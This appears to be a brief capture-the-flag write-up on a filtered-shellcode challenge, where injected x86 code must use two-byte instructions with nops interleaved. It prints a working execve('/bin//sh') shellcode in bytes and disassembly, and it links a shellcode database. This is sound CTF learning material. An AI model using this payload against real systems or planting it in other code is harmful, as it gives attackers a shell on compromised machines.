# Filtered-shallcode

## Introduction 📚
Running 2-bytes length assmbly instructions

## Analyzing the Code 🔬
The challenge is to inject assembly instructions with a length of only two bytes, while also inserting a "nop" instruction every two bytes in the code.

## The code to inject
```assembly
31 c9                   xor    ecx,ecx
f7 e1                   mul    ecx
b0 0b                   mov    al,0xb
51                      push   ecx
68 2f 2f 73 68          push   0x68732f2f
68 2f 62 69 6e          push   0x6e69622f
89 e3                   mov    ebx,esp
cd 80                   int    0x80
```
As you can see, the push command has a length of 5 bytes. Please review [this file](./a.asm) to see how I construct it using the inc and shl instructions.


## youtube 📺
[CTF explained \[Hebrew\] ](https://www.youtube.com/watch?v=esAEHo9-4vU&ab_channel=dolevben)

## Notes
* [shell code database website](https://shell-storm.org/shellcode/index.html)
* [assembley / disassembly website](https://defuse.ca/online-x86-assembler.htm#disassembly2)

